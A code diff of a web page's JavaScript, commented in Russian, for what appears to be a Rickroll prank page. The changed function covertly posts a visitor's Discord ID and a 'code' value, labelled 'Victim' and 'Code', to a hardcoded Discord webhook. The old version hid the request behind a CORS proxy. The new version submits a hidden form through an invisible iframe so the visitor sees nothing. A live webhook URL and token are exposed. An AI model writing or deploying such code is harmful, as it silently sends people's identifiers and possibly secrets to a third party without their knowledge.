@@ -63,27 +63,35 @@
         }
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
-async function sendToWebhook() {
-    // Используем прокси-сервер, чтобы скрыть источник запроса от Discord и обмануть браузер
-    const proxyUrl = "https://corsproxy.io/?"; 
-    const targetUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
-    
-    const message = {
-        content: `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``
-    };
+function sendToWebhook() {
+    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
+    const content = `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``;
 
-    try {
-        await fetch(proxyUrl + encodeURIComponent(targetUrl), {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        });
-        console.log("Лог успешно прошел через прокси!");
-    } catch (e) {
-        console.error("Даже прокси не помог, но Рикролл всё равно запущен.");
-    }
+    // Создаем невидимый iframe, чтобы страница не перезагрузилась
+    const iframe = document.createElement('iframe');
+    iframe.name = "hidden_iframe";
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+
+    // Создаем форму, которая отправит данные в Дискорд
+    const form = document.createElement('form');
+    form.method = "POST";
+    form.action = webhookUrl;
+    form.target = "hidden_iframe"; // Отправляем внутри скрытого фрейма
+
+    // Дискорд умеет принимать поле "content" даже из обычной формы
+    const input = document.createElement('input');
+    input.type = "hidden";
+    input.name = "content";
+    input.value = content;
+
+    form.appendChild(input);
+    document.body.appendChild(form);
+
+    // Поехали!
+    form.submit();
+
+    console.log("Форма отправлена в скрытом режиме.");
 }
 
         function startRickRoll() {
